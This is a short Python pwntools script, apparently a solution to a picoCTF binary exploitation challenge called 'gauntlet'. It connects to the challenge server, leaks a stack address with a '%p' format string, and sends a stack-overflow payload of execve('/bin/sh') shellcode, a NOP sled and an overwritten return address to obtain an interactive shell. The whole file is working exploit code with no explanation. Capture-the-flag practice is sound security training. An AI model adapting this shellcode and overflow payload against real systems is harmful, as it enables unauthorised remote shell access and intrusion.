#!/usr/bin/env python3
#c6e16a1b4182c2801ed657d4c482af88
#python3 solution.py

from pwn import *

format_string = "%p"

p = remote("mercury.picoctf.net", 32853)
#p = process("./gauntlet")
#raw_input("attach gdb")

# shell code for 64bit Kali/Ubuntu
shell = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
nop = b"\x90" * 97

target_address = p.recvline()  # return bytes, stacks address where input gets copied
target_address = int(target_address, 16)

p.sendline(format_string)

payload = shell + nop + p64(target_address)
print(payload)

p.sendline(payload)

p.interactive()

